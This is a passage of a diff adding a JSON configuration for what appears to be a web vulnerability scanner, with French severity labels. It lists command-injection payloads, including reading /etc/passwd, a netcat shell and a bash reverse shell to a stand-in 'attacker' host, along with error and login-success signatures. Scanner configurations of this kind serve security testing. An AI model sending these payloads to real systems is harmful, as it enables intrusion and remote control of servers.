+        "; cat /etc/passwd",
+        "| whoami",
+        "`id`",
+        "$(whoami)",
+        "| nc -e /bin/sh",
+        "| bash -i >& /dev/tcp/attacker/8080 0>&1"
+      ]
+    }
+  },
+  "response_analysis": {
+    "error_signatures": [
+      "SQL syntax error",
+      "MySQL Error",
+      "ORA-00936",
+      "Microsoft JET Database",
+      "ODBC Microsoft Access",
+      "Warning: mysql_",
+      "Fatal error",
+      "Parse error",
+      "Notice:",
+      "Undefined index",
+      "Stack trace",
+      "Uncaught Exception"
+    ],
+    "success_indicators": [
+      "login successful",
+      "welcome",
+      "dashboard",
+      "profile",
+      "admin panel",
+      "logged in",
+      "authenticated"
+    ],
+    "server_signatures": [
+      "Apache/",
+      "nginx/",
+      "Microsoft-IIS/",
+      "lighttpd/",
+      "Tomcat/",
+      "Jetty/",
+      "Cloudflare",
+      "Akamai"
+    ]
+  },
+  "severity_levels": {
+    "critique": {
+      "score": 9.0,
+      "color": "#ff0000",
+      "description": "Exploitation immédiate possible"
+    },
+    "élevé": {
+      "score": 7.0,
+      "color": "#ff6600",
+      "description": "Risque élevé d'exploitation"
+    },
+    "moyen": {
+      "score": 5.0,
+      "color": "#ffff00",
+      "description": "Risque modéré"
+    },
+    "faible": {
+      "score": 3.0,
+      "color": "#00ff00",
+      "description": "Risque faible"
+    },
+    "info": {
+      "score": 1.0,
+      "color": "#0000ff",
+      "description": "Information uniquement"
+    }
+  }
+}
